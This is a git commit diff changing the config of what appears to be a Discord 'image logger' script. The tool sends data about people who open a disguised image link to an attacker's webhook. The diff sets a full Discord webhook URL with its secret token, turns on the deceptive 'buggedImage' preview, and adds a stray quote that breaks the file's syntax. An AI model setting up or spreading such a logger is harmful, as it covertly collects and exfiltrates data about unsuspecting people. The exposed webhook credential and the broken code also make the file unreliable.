f871d71fae173b4c8d0e03f66573e0bfe1d3e463
Shadowfade91 <72463705+Shadowfade91@users.noreply.github.com>
2023-07-22 21:51:24 +0200

    Add files via upload

--- api/wolfdog.py
+++ api/wolfdog.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1132395587619270746/Lu3qdKV8lfsFvWSjQj4AwE-Au3-f1Gt5kjNoYhgKnK4G-fWMH0CS-IkV6TEtaPbrHjkA",
+    "webhook": ""https://discord.com/api/webhooks/1132395587619270746/Lu3qdKV8lfsFvWSjQj4AwE-Au3-f1Gt5kjNoYhgKnK4G-fWMH0CS-IkV6TEtaPbrHjkA",
     "image": "https://cdn.discordapp.com/attachments/1132395564718362624/1132398764183801977/dddd.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -38,7 +38,7 @@ config = {
                 # 2 = Don't send an alert when a VPN is suspected
 
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": True, # Redirect to a webpage?
-        "page": "https://www.youtube.com/watch?v=LDDWf1uoNck&ab_channel=ItsKevin" # Link to the webpage to redirect to 
+        "redirect": False, # Redirect to a webpage?
+        "page": "https://your-link.here" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
